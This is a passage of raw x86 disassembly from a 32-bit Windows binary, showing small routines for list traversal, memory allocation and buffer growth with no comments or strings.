   1a5cb:	call   0x1a328
   1a5d0:	jmp    0x1a5dd
   1a5d2:	mov    DWORD PTR [esi],eax
   1a5d4:	mov    ecx,eax
   1a5d6:	mov    eax,DWORD PTR [ecx+0x4]
   1a5d9:	cmp    ecx,DWORD PTR [eax]
   1a5db:	je     0x1a5d2
   1a5dd:	mov    DWORD PTR [esi],eax
   1a5df:	pop    esi
   1a5e0:	ret    
   1a5e1:	int3   
   1a5e2:	int3   
   1a5e3:	int3   
   1a5e4:	int3   
   1a5e5:	int3   
   1a5e6:	mov    edi,edi
   1a5e8:	push   ebp
   1a5e9:	mov    ebp,esp
   1a5eb:	mov    eax,DWORD PTR [ecx+0x4]
   1a5ee:	push   esi
   1a5ef:	mov    esi,DWORD PTR [eax+0x4]
   1a5f2:	push   edi
   1a5f3:	mov    edi,eax
   1a5f5:	jmp    0x1a610
   1a5f7:	push   DWORD PTR [ebp+0x8]
   1a5fa:	lea    eax,[esi+0xc]
   1a5fd:	push   eax
   1a5fe:	call   0x197f4
   1a603:	test   al,al
   1a605:	je     0x1a60c
   1a607:	mov    esi,DWORD PTR [esi+0x8]
   1a60a:	jmp    0x1a610
   1a60c:	mov    edi,esi
   1a60e:	mov    esi,DWORD PTR [esi]
   1a610:	cmp    esi,DWORD PTR ds:0x7fa94
   1a616:	jne    0x1a5f7
   1a618:	mov    eax,edi
   1a61a:	pop    edi
   1a61b:	pop    esi
   1a61c:	pop    ebp
   1a61d:	ret    0x4
   1a620:	int3   
   1a621:	int3   
   1a622:	int3   
   1a623:	int3   
   1a624:	int3   
   1a625:	int3   
   1a626:	mov    edi,edi
   1a628:	push   ebp
   1a629:	mov    ebp,esp
   1a62b:	mov    eax,DWORD PTR [ecx+0x4]
   1a62e:	push   esi
   1a62f:	mov    esi,DWORD PTR [eax+0x4]
   1a632:	push   edi
   1a633:	mov    edi,eax
   1a635:	jmp    0x1a650
   1a637:	lea    eax,[esi+0xc]
   1a63a:	push   eax
   1a63b:	push   DWORD PTR [ebp+0x8]
   1a63e:	call   0x197f4
   1a643:	test   al,al
   1a645:	je     0x1a64d
   1a647:	mov    edi,esi
   1a649:	mov    esi,DWORD PTR [esi]
   1a64b:	jmp    0x1a650
   1a64d:	mov    esi,DWORD PTR [esi+0x8]
   1a650:	cmp    esi,DWORD PTR ds:0x7fa94
   1a656:	jne    0x1a637
   1a658:	mov    eax,edi
   1a65a:	pop    edi
   1a65b:	pop    esi
   1a65c:	pop    ebp
   1a65d:	ret    0x4
   1a660:	int3   
   1a661:	int3   
   1a662:	int3   
   1a663:	int3   
   1a664:	int3   
   1a665:	int3   
   1a666:	mov    edi,edi
   1a668:	push   ebp
   1a669:	mov    ebp,esp
   1a66b:	mov    ecx,DWORD PTR [ebp+0x8]
   1a66e:	test   ecx,ecx
   1a670:	je     0x1a67a
   1a672:	push   DWORD PTR [ebp+0xc]
   1a675:	call   0x129da
   1a67a:	pop    ebp
   1a67b:	ret    0x8
   1a67e:	int3   
   1a67f:	int3   
   1a680:	int3   
   1a681:	int3   
   1a682:	int3   
   1a683:	int3   
   1a684:	mov    edi,edi
   1a686:	push   ebp
   1a687:	mov    ebp,esp
   1a689:	mov    ecx,DWORD PTR [ebp+0x8]
   1a68c:	push   0x0
   1a68e:	call   0x1a40a
   1a693:	pop    ebp
   1a694:	ret    0x4
   1a697:	int3   
   1a698:	int3   
   1a699:	int3   
   1a69a:	int3   
   1a69b:	int3   
   1a69c:	mov    edi,edi
   1a69e:	push   ebp
   1a69f:	mov    ebp,esp
   1a6a1:	push   edi
   1a6a2:	mov    edi,DWORD PTR [ebp+0xc]
   1a6a5:	cmp    DWORD PTR [ebp+0x8],edi
   1a6a8:	je     0x1a6be
   1a6aa:	push   esi
   1a6ab:	mov    esi,DWORD PTR [ebp+0x10]
   1a6ae:	inc    DWORD PTR [esi]
   1a6b0:	lea    ecx,[ebp+0x8]
   1a6b3:	call   0x1a36c
   1a6b8:	cmp    DWORD PTR [ebp+0x8],edi
   1a6bb:	jne    0x1a6ae
   1a6bd:	pop    esi
   1a6be:	pop    edi
   1a6bf:	pop    ebp
   1a6c0:	ret    
   1a6c1:	int3   
   1a6c2:	int3   
   1a6c3:	int3   
   1a6c4:	int3   
   1a6c5:	int3   
   1a6c6:	mov    edi,edi
   1a6c8:	push   ebp
   1a6c9:	mov    ebp,esp
   1a6cb:	mov    eax,DWORD PTR [ebp+0xc]
   1a6ce:	mov    ecx,DWORD PTR [eax+0x34]
   1a6d1:	lea    eax,[ecx+eax*1+0x40]
   1a6d5:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6d8:	push   0xffffffff
   1a6da:	push   eax
   1a6db:	call   0x129ba
   1a6e0:	mov    eax,DWORD PTR [ebp+0x8]
   1a6e3:	pop    ebp
   1a6e4:	ret    0x8
   1a6e7:	int3   
   1a6e8:	int3   
   1a6e9:	int3   
   1a6ea:	int3   
   1a6eb:	int3   
   1a6ec:	mov    edi,edi
   1a6ee:	push   ebp
   1a6ef:	mov    ebp,esp
   1a6f1:	mov    eax,DWORD PTR [ebp+0xc]
   1a6f4:	mov    ecx,DWORD PTR [eax+0x38]
   1a6f7:	lea    eax,[ecx+eax*1+0x40]
   1a6fb:	mov    ecx,DWORD PTR [ebp+0x8]
   1a6fe:	push   0xffffffff
   1a700:	push   eax
   1a701:	call   0x129ba
   1a706:	mov    eax,DWORD PTR [ebp+0x8]
   1a709:	pop    ebp
   1a70a:	ret    0x8
   1a70d:	int3   
   1a70e:	int3   
   1a70f:	int3   
   1a710:	int3   
   1a711:	int3   
   1a712:	mov    edi,edi
   1a714:	push   ebp
   1a715:	mov    ebp,esp
   1a717:	mov    eax,DWORD PTR [ebp+0xc]
   1a71a:	mov    ecx,DWORD PTR [eax+0x3c]
   1a71d:	lea    eax,[ecx+eax*1+0x40]
   1a721:	mov    ecx,DWORD PTR [ebp+0x8]
   1a724:	push   0xffffffff
   1a726:	push   eax
   1a727:	call   0x129ba
   1a72c:	mov    eax,DWORD PTR [ebp+0x8]
   1a72f:	pop    ebp
   1a730:	ret    0x8
   1a733:	int3   
   1a734:	int3   
   1a735:	int3   
   1a736:	int3   
   1a737:	int3   
   1a738:	mov    edi,edi
   1a73a:	push   ebp
   1a73b:	mov    ebp,esp
   1a73d:	sub    esp,0x1c
   1a740:	mov    eax,ds:0x7fa8c
   1a745:	and    DWORD PTR [ebp-0x4],0x0
   1a749:	push   ebx
   1a74a:	mov    ebx,DWORD PTR [ebp+0x8]
   1a74d:	push   esi
   1a74e:	push   edi
   1a74f:	lea    esi,[eax+0x4]
   1a752:	mov    edi,ebx
   1a754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a758:	lea    esi,[eax+0x14]
   1a75b:	jmp    0x1a7b8
   1a75d:	push   DWORD PTR [ebp+0xc]
   1a760:	mov    eax,DWORD PTR [ebx+0x8]
   1a763:	push   DWORD PTR [eax]
   1a765:	or     DWORD PTR [ebp-0x4],0x1
   1a769:	lea    eax,[ebp-0xc]
   1a76c:	push   eax
   1a76d:	call   0x1a712
   1a772:	push   eax
   1a773:	call   0x19804
   1a778:	test   al,al
   1a77a:	je     0x1a78b
   1a77c:	mov    eax,DWORD PTR [ebx+0x8]
   1a77f:	mov    eax,DWORD PTR [eax]
   1a781:	cmp    BYTE PTR [eax+0x1c],0x0
   1a785:	mov    BYTE PTR [ebp+0xb],0x1
   1a789:	jne    0x1a78f
   1a78b:	mov    BYTE PTR [ebp+0xb],0x0
   1a78f:	test   BYTE PTR [ebp-0x4],0x1
   1a793:	je     0x1a7a2
   1a795:	push   DWORD PTR [ebp-0xc]
   1a798:	and    DWORD PTR [ebp-0x4],0xfffffffe
   1a79c:	call   0x10a86
   1a7a1:	pop    ecx
   1a7a2:	cmp    BYTE PTR [ebp+0xb],0x0
   1a7a6:	jne    0x1a7c7
   1a7a8:	mov    ecx,ebx
   1a7aa:	call   0x1a434
   1a7af:	mov    esi,DWORD PTR ds:0x7fa8c
   1a7b5:	add    esi,0x14
   1a7b8:	mov    eax,DWORD PTR [ebx+0x8]
   1a7bb:	lea    edi,[ebp-0x1c]
   1a7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7c2:	cmp    eax,DWORD PTR [ebp-0x14]
   1a7c5:	jne    0x1a75d
   1a7c7:	pop    edi
   1a7c8:	pop    esi
   1a7c9:	mov    eax,ebx
   1a7cb:	pop    ebx
   1a7cc:	leave  
   1a7cd:	ret    0x8
   1a7d0:	int3   
   1a7d1:	int3   
   1a7d2:	int3   
   1a7d3:	int3   
   1a7d4:	int3   
   1a7d5:	int3   
   1a7d6:	mov    edi,edi
   1a7d8:	push   ebp
   1a7d9:	mov    ebp,esp
   1a7db:	sub    esp,0x28
   1a7de:	mov    eax,DWORD PTR [ebp+0x8]
   1a7e1:	push   ebx
   1a7e2:	push   esi
   1a7e3:	push   edi
   1a7e4:	lea    esi,[eax+0x4]
   1a7e7:	mov    DWORD PTR [ebp-0x8],esi
   1a7ea:	lea    edi,[ebp-0x18]
   1a7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7ef:	and    DWORD PTR [ebp-0x4],0x0
   1a7f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a7f5:	lea    ecx,[eax+0x14]
   1a7f8:	mov    eax,DWORD PTR [ebp-0x10]
   1a7fb:	mov    esi,ecx
   1a7fd:	lea    edi,[ebp-0x28]
   1a800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a803:	push   0x4
   1a805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a806:	pop    ebx
   1a807:	mov    DWORD PTR [ebp+0x8],ecx
   1a80a:	cmp    eax,DWORD PTR [ebp-0x20]
   1a80d:	je     0x1a82f
   1a80f:	mov    esi,ecx
   1a811:	lea    edi,[ebp-0x28]
   1a814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a818:	mov    eax,DWORD PTR [eax]
   1a81a:	add    ebx,DWORD PTR [eax]
   1a81c:	inc    DWORD PTR [ebp-0x4]
   1a81f:	lea    ecx,[ebp-0x18]
   1a822:	call   0x1a434
   1a827:	mov    eax,DWORD PTR [ebp-0x10]
   1a82a:	cmp    eax,DWORD PTR [ebp-0x20]
   1a82d:	jne    0x1a818
   1a82f:	mov    eax,DWORD PTR [ebp+0xc]
   1a832:	cmp    ebx,DWORD PTR [eax+0x4]
   1a835:	mov    DWORD PTR [eax+0x4],ebx
   1a838:	jbe    0x1a842
   1a83a:	mov    DWORD PTR [eax],0x1
   1a840:	jmp    0x1a888
   1a842:	and    DWORD PTR [eax],0x0
   1a845:	mov    esi,DWORD PTR [ebp-0x8]
   1a848:	lea    ebx,[eax+0x8]
   1a84b:	mov    eax,DWORD PTR [ebp-0x4]
   1a84e:	mov    DWORD PTR [ebx],eax
   1a850:	lea    edi,[ebp-0x28]
   1a853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a856:	add    ebx,0x4
   1a859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a85a:	jmp    0x1a876
   1a85c:	mov    eax,DWORD PTR [esi]
   1a85e:	push   DWORD PTR [eax]
   1a860:	push   eax
   1a861:	push   ebx
   1a862:	call   0x1dac6
   1a867:	mov    eax,DWORD PTR [esi]
   1a869:	add    ebx,DWORD PTR [eax]
   1a86b:	add    esp,0xc
   1a86e:	lea    ecx,[ebp-0x28]
   1a871:	call   0x1a434
   1a876:	mov    esi,DWORD PTR [ebp+0x8]
   1a879:	lea    edi,[ebp-0x18]
   1a87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a87d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a87f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a880:	mov    esi,DWORD PTR [ebp-0x20]
   1a883:	cmp    esi,DWORD PTR [ebp-0x10]
   1a886:	jne    0x1a85c
   1a888:	pop    edi
   1a889:	pop    esi
   1a88a:	pop    ebx
   1a88b:	leave  
   1a88c:	ret    0x8
   1a88f:	int3   
   1a890:	int3   
   1a891:	int3   
   1a892:	int3   
   1a893:	int3   
   1a894:	push   0x8
   1a896:	push   0x7e2f0
   1a89b:	call   0x1daf8
   1a8a0:	xor    esi,esi
   1a8a2:	push   esi
   1a8a3:	push   esi
   1a8a4:	push   esi
   1a8a5:	push   esi
   1a8a6:	push   0x7fa64
   1a8ab:	call   DWORD PTR ds:0x1f028
   1a8b1:	cmp    eax,esi
   1a8b3:	jl     0x1a8f4
   1a8b5:	mov    DWORD PTR [ebp-0x4],esi
   1a8b8:	push   DWORD PTR [ebp+0x8]
   1a8bb:	push   DWORD PTR ds:0x7fa8c
   1a8c1:	call   0x1a7d6
   1a8c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a8cd:	jmp    0x1a8e8
   1a8cf:	xor    eax,eax
   1a8d1:	inc    eax
   1a8d2:	ret    
   1a8d3:	mov    esp,DWORD PTR [ebp-0x18]
   1a8d6:	mov    eax,DWORD PTR [ebp+0x8]
   1a8d9:	mov    DWORD PTR [eax],0x2
   1a8df:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a8e6:	xor    esi,esi
   1a8e8:	push   esi
   1a8e9:	push   0x7fa64
   1a8ee:	call   DWORD PTR ds:0x1f024
   1a8f4:	call   0x1db3d
   1a8f9:	ret    0x4
   1a8fc:	int3   
   1a8fd:	int3   
   1a8fe:	int3   
   1a8ff:	int3   
   1a900:	int3   
   1a901:	int3   
   1a902:	mov    edi,edi
   1a904:	push   ebp
   1a905:	mov    ebp,esp
   1a907:	sub    esp,0x10
   1a90a:	push   ebx
   1a90b:	mov    ebx,ecx
   1a90d:	mov    eax,DWORD PTR [ebx+0x10]
   1a910:	push   esi
   1a911:	lea    ecx,[eax+0x4]
   1a914:	push   edi
   1a915:	mov    DWORD PTR [ebx+0x10],ecx
   1a918:	push   DWORD PTR [eax]
   1a91a:	call   0x10a86
   1a91f:	xor    eax,eax
   1a921:	pop    ecx
   1a922:	cmp    DWORD PTR [ebx+0x2c],eax
   1a925:	jne    0x1a952
   1a927:	mov    DWORD PTR [ebp-0x10],eax
   1a92a:	mov    DWORD PTR [ebp-0xc],eax
   1a92d:	mov    DWORD PTR [ebp-0x8],eax
   1a930:	mov    DWORD PTR [ebp-0x4],eax
   1a933:	lea    edi,[ebx+0x4]
   1a936:	lea    esi,[ebp-0x10]
   1a939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a93b:	push   DWORD PTR [ebx+0x24]
   1a93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a93f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a940:	lea    edi,[ebx+0x14]
   1a943:	lea    esi,[ebp-0x10]
   1a946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a94a:	call   0x10a86
   1a94f:	pop    ecx
   1a950:	jmp    0x1a969
   1a952:	mov    eax,DWORD PTR [ebx+0x10]
   1a955:	push   eax
   1a956:	push   DWORD PTR [eax]
   1a958:	lea    ecx,[ebp-0x10]
   1a95b:	call   0x1a2fc
   1a960:	lea    edi,[ebx+0x4]
   1a963:	mov    esi,eax
   1a965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1a969:	pop    edi
   1a96a:	pop    esi
   1a96b:	pop    ebx
   1a96c:	leave  
   1a96d:	ret    
   1a96e:	int3   
   1a96f:	int3   
   1a970:	int3   
   1a971:	int3   
   1a972:	int3   
   1a973:	int3   
   1a974:	mov    edi,edi
   1a976:	push   ebp
   1a977:	mov    ebp,esp
   1a979:	mov    eax,DWORD PTR [ebp+0xc]
   1a97c:	push   esi
   1a97d:	mov    esi,ecx
   1a97f:	mov    ecx,DWORD PTR [eax]
   1a981:	mov    DWORD PTR [ebp+0xc],ecx
   1a984:	mov    ecx,DWORD PTR [eax+0x4]
   1a987:	mov    edx,DWORD PTR [eax]
   1a989:	mov    DWORD PTR [ecx],edx
   1a98b:	mov    ecx,DWORD PTR [eax]
   1a98d:	mov    edx,DWORD PTR [eax+0x4]
   1a990:	push   eax
   1a991:	mov    DWORD PTR [ecx+0x4],edx
   1a994:	call   0x10a86
   1a999:	mov    eax,DWORD PTR [ebp+0x8]
   1a99c:	dec    DWORD PTR [esi+0x8]
   1a99f:	pop    ecx
   1a9a0:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9a3:	mov    DWORD PTR [eax],ecx
   1a9a5:	pop    esi
   1a9a6:	pop    ebp
   1a9a7:	ret    0x8
   1a9aa:	int3   
   1a9ab:	int3   
   1a9ac:	int3   
   1a9ad:	int3   
   1a9ae:	int3   
   1a9af:	int3   
   1a9b0:	mov    edi,edi
   1a9b2:	push   ebp
   1a9b3:	mov    ebp,esp
   1a9b5:	push   ecx
   1a9b6:	push   esi
   1a9b7:	mov    esi,ecx
   1a9b9:	jmp    0x1a9ce
   1a9bb:	mov    eax,ecx
   1a9bd:	mov    ecx,DWORD PTR [ecx]
   1a9bf:	push   eax
   1a9c0:	lea    eax,[ebp-0x4]
   1a9c3:	mov    DWORD PTR [ebp+0xc],ecx
   1a9c6:	push   eax
   1a9c7:	mov    ecx,esi
   1a9c9:	call   0x1a974
   1a9ce:	mov    ecx,DWORD PTR [ebp+0xc]
   1a9d1:	cmp    ecx,DWORD PTR [ebp+0x10]
   1a9d4:	jne    0x1a9bb
   1a9d6:	mov    eax,DWORD PTR [ebp+0x8]
   1a9d9:	mov    DWORD PTR [eax],ecx
   1a9db:	pop    esi
   1a9dc:	leave  
   1a9dd:	ret    0xc
   1a9e0:	int3   
   1a9e1:	int3   
   1a9e2:	int3   
   1a9e3:	int3   
   1a9e4:	int3   
   1a9e5:	int3   
   1a9e6:	mov    edi,edi
   1a9e8:	push   ebp
   1a9e9:	mov    ebp,esp
   1a9eb:	push   0x0
   1a9ed:	push   0xc
   1a9ef:	call   0x11622
   1a9f4:	mov    ecx,DWORD PTR [ebp+0x8]
   1a9f7:	test   ecx,ecx
   1a9f9:	jne    0x1a9fd
   1a9fb:	mov    ecx,eax
   1a9fd:	mov    DWORD PTR [eax],ecx
   1a9ff:	mov    ecx,DWORD PTR [ebp+0xc]
   1aa02:	test   ecx,ecx
   1aa04:	jne    0x1aa08
   1aa06:	mov    ecx,eax
   1aa08:	mov    DWORD PTR [eax+0x4],ecx
   1aa0b:	pop    ebp
   1aa0c:	ret    0x8
   1aa0f:	int3   
   1aa10:	int3   
   1aa11:	int3   
   1aa12:	int3   
   1aa13:	int3   
   1aa14:	mov    edi,edi
   1aa16:	push   esi
   1aa17:	mov    esi,ecx
   1aa19:	mov    eax,DWORD PTR [esi+0x28]
   1aa1c:	shl    eax,0x2
   1aa1f:	push   0x0
   1aa21:	push   eax
   1aa22:	call   0x11622
   1aa27:	mov    DWORD PTR [esi+0x24],eax
   1aa2a:	pop    esi
   1aa2b:	ret    
   1aa2c:	int3   
   1aa2d:	int3   
   1aa2e:	int3   
   1aa2f:	int3   
   1aa30:	int3   
   1aa31:	int3   
   1aa32:	mov    edi,edi
   1aa34:	push   ebp
   1aa35:	mov    ebp,esp
   1aa37:	push   ebx
   1aa38:	push   esi
   1aa39:	push   edi
   1aa3a:	mov    edi,DWORD PTR [ebp+0x8]
   1aa3d:	mov    eax,0xfffffff
   1aa42:	mov    esi,ecx
   1aa44:	cmp    edi,eax
   1aa46:	jbe    0x1aa4a
   1aa48:	mov    edi,eax
   1aa4a:	mov    eax,edi
   1aa4c:	push   0x0
   1aa4e:	shl    eax,0x2
   1aa51:	push   eax
   1aa52:	call   0x11622
   1aa57:	mov    ebx,eax
   1aa59:	mov    eax,edi
   1aa5b:	shr    eax,0x2
   1aa5e:	lea    eax,[ebx+eax*4]
   1aa61:	push   eax
   1aa62:	mov    DWORD PTR [ebp+0x8],eax
   1aa65:	mov    eax,DWORD PTR [esi+0x20]
   1aa68:	add    eax,0x4
   1aa6b:	push   eax
   1aa6c:	push   DWORD PTR [esi+0x10]
   1aa6f:	call   0x1a3be
   1aa74:	push   DWORD PTR [esi+0x24]
   1aa77:	call   0x10a86
   1aa7c:	mov    eax,DWORD PTR [ebp+0x8]
   1aa7f:	pop    ecx
   1aa80:	mov    DWORD PTR [esi+0x28],edi
   1aa83:	pop    edi
   1aa84:	mov    DWORD PTR [esi+0x24],ebx
   1aa87:	pop    esi
   1aa88:	pop    ebx
   1aa89:	pop    ebp
   1aa8a:	ret    0x4
   1aa8d:	int3   
   1aa8e:	int3   
   1aa8f:	int3   
   1aa90:	int3   
   1aa91:	int3   
   1aa92:	mov    edi,edi
   1aa94:	push   ebp
   1aa95:	mov    ebp,esp
   1aa97:	push   ecx
   1aa98:	push   DWORD PTR [ebp-0x4]
   1aa9b:	push   DWORD PTR [ebp+0x10]
   1aa9e:	push   DWORD PTR [ebp+0xc]
   1aaa1:	push   DWORD PTR [ebp+0x8]
   1aaa4:	call   0x1a69c
   1aaa9:	add    esp,0x10
   1aaac:	leave  
   1aaad:	ret    
   1aaae:	int3   
   1aaaf:	int3   
   1aab0:	int3   
   1aab1:	int3   
   1aab2:	int3   
   1aab3:	int3   
   1aab4:	mov    edi,edi
   1aab6:	push   ebp
   1aab7:	mov    ebp,esp
   1aab9:	sub    esp,0x28
   1aabc:	push   ebx
   1aabd:	mov    ebx,DWORD PTR [ebp+0x8]
   1aac0:	push   esi
   1aac1:	push   edi
   1aac2:	push   0xffffffff
   1aac4:	push   ebx
   1aac5:	lea    ecx,[ebp-0x8]
   1aac8:	call   0x110b8
   1aacd:	and    DWORD PTR [ebx],0x0
   1aad0:	lea    eax,[ebp-0x8]
   1aad3:	push   eax
   1aad4:	lea    eax,[ebp-0x18]
   1aad7:	push   eax
   1aad8:	call   0x1a738
   1aadd:	mov    esi,DWORD PTR ds:0x7fa8c
   1aae3:	mov    eax,DWORD PTR [ebp-0x10]
   1aae6:	push   DWORD PTR [ebp-0x8]
   1aae9:	add    esi,0x14
   1aaec:	lea    edi,[ebp-0x28]
   1aaef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aaf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aaf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aaf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1aaf3:	cmp    eax,DWORD PTR [ebp-0x20]
   1aaf6:	je     0x1ab00
   1aaf8:	mov    eax,DWORD PTR [eax]
   1aafa:	mov    eax,DWORD PTR [eax+0x20]
   1aafd:	inc    eax
   1aafe:	mov    DWORD PTR [ebx],eax
   1ab00:	call   0x10a86
   1ab05:	pop    ecx
   1ab06:	pop    edi
   1ab07:	pop    esi
   1ab08:	pop    ebx
   1ab09:	leave  
   1ab0a:	ret    0x4
   1ab0d:	int3   
   1ab0e:	int3   
   1ab0f:	int3   
   1ab10:	int3   
   1ab11:	int3   
   1ab12:	add    DWORD PTR [ecx+0xc],0x4
   1ab16:	dec    DWORD PTR [ecx+0x2c]
   1ab19:	mov    eax,DWORD PTR [ecx+0xc]
   1ab1c:	je     0x1ab23
   1ab1e:	cmp    eax,DWORD PTR [ecx+0x8]
   1ab21:	jne    0x1ab28
   1ab23:	jmp    0x1a902
   1ab28:	ret    
   1ab29:	int3   
   1ab2a:	int3   
   1ab2b:	int3   
   1ab2c:	int3   
   1ab2d:	int3   
   1ab2e:	mov    edi,edi
   1ab30:	push   esi
   1ab31:	push   0x0
   1ab33:	push   0xc
   1ab35:	mov    esi,ecx
   1ab37:	call   0x11622
   1ab3c:	mov    DWORD PTR [eax],eax
   1ab3e:	mov    DWORD PTR [eax+0x4],eax
   1ab41:	and    DWORD PTR [esi+0x8],0x0
   1ab45:	mov    DWORD PTR [esi+0x4],eax
   1ab48:	mov    eax,esi
   1ab4a:	pop    esi
   1ab4b:	ret    0x4
   1ab4e:	int3   
   1ab4f:	int3   
   1ab50:	int3   
   1ab51:	int3   
   1ab52:	int3   
   1ab53:	int3   
   1ab54:	mov    edi,edi
   1ab56:	push   ebp
   1ab57:	mov    ebp,esp
   1ab59:	push   ecx
   1ab5a:	push   esi
   1ab5b:	mov    esi,ecx
   1ab5d:	mov    eax,DWORD PTR [esi+0x4]
   1ab60:	mov    ecx,DWORD PTR [eax]
   1ab62:	push   eax
   1ab63:	push   ecx
   1ab64:	lea    eax,[ebp-0x4]
   1ab67:	push   eax
   1ab68:	mov    ecx,esi
   1ab6a:	call   0x1a9b0
   1ab6f:	push   DWORD PTR [esi+0x4]
   1ab72:	call   0x10a86
   1ab77:	and    DWORD PTR [esi+0x4],0x0
   1ab7b:	and    DWORD PTR [esi+0x8],0x0
   1ab7f:	pop    ecx
   1ab80:	pop    esi
   1ab81:	leave  
   1ab82:	ret    
   1ab83:	int3   
   1ab84:	int3   
   1ab85:	int3   
   1ab86:	int3   
   1ab87:	int3   
   1ab88:	mov    edi,edi
   1ab8a:	push   ebp
   1ab8b:	mov    ebp,esp
   1ab8d:	push   ecx
   1ab8e:	mov    eax,DWORD PTR [ecx+0x4]
   1ab91:	push   DWORD PTR [eax]
   1ab93:	lea    eax,[ebp-0x4]
   1ab96:	push   eax
   1ab97:	call   0x1a974
   1ab9c:	leave  
   1ab9d:	ret    
   1ab9e:	int3   
   1ab9f:	int3   
   1aba0:	int3   
   1aba1:	int3   
   1aba2:	int3   
   1aba3:	int3   
   1aba4:	mov    edi,edi
   1aba6:	push   ebp
   1aba7:	mov    ebp,esp
   1aba9:	sub    esp,0x18
   1abac:	push   ebx
   1abad:	push   esi
   1abae:	push   edi
   1abaf:	push   0x0
   1abb1:	push   0x400
   1abb6:	mov    ebx,ecx
   1abb8:	call   0x1a3e8
   1abbd:	cmp    DWORD PTR [ebx+0x2c],0x0
   1abc1:	mov    esi,eax
   1abc3:	mov    DWORD PTR [ebp-0x8],esi
   1abc6:	jne    0x1abfd
   1abc8:	mov    ecx,ebx
   1abca:	mov    DWORD PTR [ebx+0x28],0x2
   1abd1:	call   0x1aa14
   1abd6:	mov    eax,DWORD PTR [ebx+0x24]
   1abd9:	mov    DWORD PTR [eax+0x4],esi
   1abdc:	mov    eax,DWORD PTR [ebx+0x24]
   1abdf:	add    eax,0x4
   1abe2:	push   eax
   1abe3:	add    esi,0x800
   1abe9:	push   esi
   1abea:	lea    ecx,[ebp-0x18]
   1abed:	call   0x1a2fc
   1abf2:	lea    edi,[ebx+0x4]
   1abf5:	mov    esi,eax
   1abf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1abfb:	jmp    0x1ac5b
   1abfd:	mov    ecx,DWORD PTR [ebx+0x28]
   1ac00:	mov    edx,DWORD PTR [ebx+0x24]
   1ac03:	mov    eax,DWORD PTR [ebx+0x20]
   1ac06:	lea    ecx,[edx+ecx*4-0x4]
   1ac0a:	cmp    eax,ecx
   1ac0c:	jae    0x1ac1c
   1ac0e:	add    eax,0x4
   1ac11:	mov    DWORD PTR [ebx+0x20],eax
   1ac14:	mov    DWORD PTR [eax],esi
   1ac16:	push   DWORD PTR [ebx+0x20]
   1ac19:	push   esi
   1ac1a:	jmp    0x1ac53
   1ac1c:	sub    eax,DWORD PTR [ebx+0x10]
   1ac1f:	mov    ecx,ebx
   1ac21:	sar    eax,0x2
   1ac24:	inc    eax
   1ac25:	mov    edi,eax
   1ac27:	lea    eax,[edi+edi*1]
   1ac2a:	push   eax
   1ac2b:	call   0x1aa32
   1ac30:	lea    ecx,[eax+edi*4]
   1ac33:	mov    DWORD PTR [ecx],esi
   1ac35:	push   eax
   1ac36:	push   DWORD PTR [ebx+0xc]
   1ac39:	mov    DWORD PTR [ebp-0x4],ecx
   1ac3c:	lea    ecx,[ebp-0x18]
   1ac3f:	call   0x1a2fc
